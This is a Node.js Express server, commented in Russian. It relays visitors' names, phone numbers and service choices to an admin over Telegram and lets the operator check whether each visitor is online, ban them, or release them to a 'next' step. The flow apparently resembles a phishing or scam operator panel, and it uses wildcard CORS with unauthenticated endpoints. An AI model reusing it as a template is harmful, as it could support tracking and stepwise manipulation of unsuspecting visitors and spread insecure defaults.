const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");
  next();
});

const mainBot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true });

const adminId = Number(process.env.ADMIN_CHAT_ID);

// базы
let bannedUsers = {};
let userStatus = {};
let seenUsers = {};
let onlineUsers = {};
let requestTexts = {};

// ===== ONLINE =====
function isOnline(id) {
  if (!onlineUsers[id]) return false;
  return (Date.now() - onlineUsers[id]) < 15000;
}

// ===== ВХОД =====
app.post("/enter", (req, res) => {
  const id = req.body.clientId;

  onlineUsers[id] = Date.now();

  enterBot.sendMessage(adminId, `👀 Вход\n🆔 ${id}`);
  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ОТПРАВКА =====
app.post("/send", (req, res) => {
  const data = req.body;
  const id = data.clientId;

  if (bannedUsers[id]) return res.json({ ok: false });

  userStatus[id] = "wait";

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";

  const baseText = `${statusText}

🆔 ID: ${id}

📦 ${data.service}
👤 ${data.name}
📞 ${data.phone}`;

  requestTexts[id] = baseText;

  mainBot.sendMessage(adminId, baseText, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🟢 Онлайн?", callback_data: "check_" + id }
        ],
        [
          { text: "🚫 Бан", callback_data: "ban_" + id },
          { text: "✅ Разбан", callback_data: "unban_" + id }
        ],
        [
          { text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }
        ]
      ]
    }
  });

  res.json({ ok: true, id });
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== КНОПКИ =====
mainBot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  // 🔥 ПРОВЕРКА ОНЛАЙН (обновляет сообщение)
  if (data.startsWith("check")) {
    const online = isOnline(id);

    const newText = `${requestTexts[id]}

Статус: ${online ? "🟢 Онлайн" : "🔴 Оффлайн"}`;

    try {
      await mainBot.editMessageText(newText, {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        reply_markup: q.message.reply_markup
      });
    } catch {}

    mainBot.answerCallbackQuery(q.id);
  }

  // 🔥 БАН
  if (data.startsWith("ban")) {
    bannedUsers[id] = true;
    mainBot.answerCallbackQuery(q.id, { text: "🚫 Забанен" });
  }

  // 🔥 РАЗБАН
  if (data.startsWith("unban")) {
    delete bannedUsers[id];
    mainBot.answerCallbackQuery(q.id, { text: "✅ Разбанен" });
  }

  // 🔥 ДАЛЬШЕ
  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    mainBot.answerCallbackQuery(q.id, { text: "➡️ Дальше" });
  }
});

app.listen(process.env.PORT || 3000);
